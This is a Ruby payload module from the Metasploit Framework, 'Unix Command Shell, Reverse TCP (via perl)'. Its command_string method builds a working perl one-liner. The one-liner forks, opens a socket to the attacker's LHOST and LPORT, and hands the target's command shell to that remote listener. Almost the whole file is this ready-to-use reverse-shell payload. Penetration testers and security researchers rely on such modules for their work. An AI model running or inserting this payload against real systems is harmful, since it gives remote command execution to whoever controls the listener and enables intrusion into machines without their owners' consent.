##
# $Id: reverse_perl.rb 8615 2010-02-24 01:19:59Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Reverse TCP (via perl)',
			'Version'       => '$Revision: 8615 $',
			'Description'   => 'Creates an interactive shell via perl',
			'Author'        => 'cazz',
			'License'       => BSD_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'RequiredCmd'   => 'perl',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end

	#
	# Returns the command string to use for execution
	#
	def command_string
		cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"#{datastore['LHOST']}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
	end

end
